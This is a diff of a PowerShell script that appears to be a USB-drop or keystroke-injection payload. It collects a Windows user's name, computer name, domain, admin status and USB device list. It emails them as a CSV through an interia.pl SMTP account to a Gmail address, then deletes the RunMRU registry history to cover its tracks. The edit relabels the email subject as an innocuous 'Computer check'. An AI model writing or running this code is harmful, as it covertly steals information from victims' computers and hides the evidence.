@@ -2,7 +2,7 @@ $SmtpServer = "poczta.interia.pl" ; $SmtpPort = "587"
 $secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
 $user = $u + "@interia.pl"
 $cred = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
-$Subject = "WiFi"
+$Subject = "Computer check"
 $To = $T + "@gmail.com"
 
 $name = $env:UserName
@@ -44,5 +44,5 @@ $F2 = "$env:USERNAME-USB.csv"
 $u | Export-Csv -Path "$env:tmp/$F2" -NoTypeInformation
 $Body = "<h3>Username: 3333<br>ComputerName: ::<br>Domain: ww<br>Admin: xx</h3>" -replace "3333",$name  -replace "::",$computername -replace "ww",$domain -replace "xx",$admin
 
-Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml -Attachments "$env:tmp/$F2" -Encoding UTF8
+Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml -Attachments "$env:tmp/$F2"
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
